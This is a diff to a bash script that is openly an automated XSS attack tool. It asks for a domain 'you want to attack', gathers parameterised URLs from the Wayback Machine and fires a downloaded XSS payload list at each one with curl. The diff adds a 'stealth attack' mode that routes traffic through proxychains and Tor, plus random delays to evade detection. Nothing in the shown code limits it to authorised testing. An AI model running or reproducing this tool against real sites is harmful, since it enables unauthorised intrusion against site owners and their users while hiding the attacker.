@@ -30,12 +30,38 @@ tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
 # Ask the user to enter a domain
 echo "Enter the domain you want to attack: " | lolcat
 read domain
-
-# Use waybackmachine to fetch URLs and filter them based on parameters contained in the URLs
-echo "Fetching URLs from the Wayback Machine..." | lolcat
-if ! waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt; then
-    echo "Error: Failed to fetch URLs from the Wayback Machine for $domain" | lolcat
-    exit 1
+# Ask the user if they want to perform a stealth attack
+echo "Do you want to perform a stealth attack? (y/n)" | lolcat
+read stealth_attack
+# Use proxychains if the user said yes
+if [[ $stealth_attack == "y" ]]; then
+    # Check if proxychains4 is installed
+    echo "Checking & Installing Proxychains..." | lolcat
+    if ! command -v proxychains4 > /dev/null; then
+        echo "proxychains4 is not installed, installing now..." | lolcat
+        # Check the architecture used
+        architecture=$(uname)
+        # Install proxychains4 based on the architecture
+        if [[ "$(uname -s)" == "Darwin" ]]; then
+            brew install proxychains-ng
+            brew install torsocks
+            torsocks
+        elif [[ "$(uname -s)" == "Linux" ]]; then
+            sudo apt-get install -y proxychains4
+            sudo apt-get install -y torsocks
+            torsocks
+        else
+            echo "OS not supported or detected" | lolcat
+            exit 1
+        fi
+    else
+        echo "proxychains4 is already installed, proceeding with stealth attack..." | lolcat
+        proxychains4 waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
+    fi
+else
+    # Fetch URLs normally
+    echo "Proceeding with attack without Stealh..." | lolcat
+    waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
 fi
 
 # Use a remote XSS payload list from github
@@ -50,19 +76,50 @@ if test ! -f "$payload_file"; then
         echo "Payload list already present in the current folder, proceeding" | lolcat
     fi
 fi
+#Install PV
+echo "Installing Progress Bar depending on the architecture of your machine used..." | lolcat
+# Check the architecture used
+architecture=$(uname)
+# Install pv based on the architecture
+# Check for operating system architecture and install pv accordingly
+if [[ "$(uname -s)" == "Darwin" ]]; then
+    if ! command -v pv > /dev/null; then
+        echo "MacOS Detected and pv is not installed, installing now..." | lolcat
+        brew install pv
+    else
+        echo "Linux Detected and pv is already installed, proceeding..." | lolcat
+    fi
+elif [[ "$(uname -s)" == "Linux" ]]; then
+    if ! command -v pv > /dev/null; then
+        echo "pv is not installed, installing now..."
+        sudo apt-get install -y pv
+    else
+        echo "pv is already installed, proceeding..."
+    fi
+else
+    echo "OS not supported or detected"
+    exit 1
+fi
+echo "Starting Attack:" | lolcat
 # Use cat to read the payload_list and send the GET request with that list of payload
-echo "Attacking with XSS Payloads..." | lolcat
+# Initialize counter variable
+# Use cat to read the payload_list and send the GET request with that list of payload
 # Initialize counter variable
 counter=0
 while read payload; do
         for url in $(cat param_urls.txt | sed 's/\([^=&?]*\)=.*/\1=/g'); do
                 echo "Sending payload $payload to $url" 
+                # Add random delay between requests
+                random_delay=$(awk 'BEGIN{srand();print int(rand()*2)}')
+sleep $random_delay
+
                 response=$(curl -s -G "$url$payload" -w "%{http_code}")
                 status_code=${response: -3}
                 if echo "$response" | grep -q "payload_marker"; then
                         echo "Possibly Vulnerable to XSS ! $url" | lolcat
                         echo $url >> affected_urls.txt
                         counter=$((counter+1))
+                        triggered_payload="$payload"
                 fi
                 if [[ $status_code == "200" ]]; then
                         echo -e "\033[0;32m$status_code\033[0m"
@@ -71,9 +128,16 @@ while read payload; do
                 fi
                 # Display the full URL with payload
                 echo "$url$payload"
+                # Add progress bar
+                echo -n "." | pv -qL 10
         done
-done < xss-payload-list.txt
+done < <(pv -N "XSS Payloads" xss-payload-list.txt)
 
+if [ -n "$triggered_payload" ]; then
+    echo "Displaying the payload that triggered the vulnerability: $triggered_payload"
+else
+    echo "No vulnerabilities found"
+fi
 
 echo "Creating the Folder and saving all the results..." | lolcat
 # Create a folder with the domain name and save the results
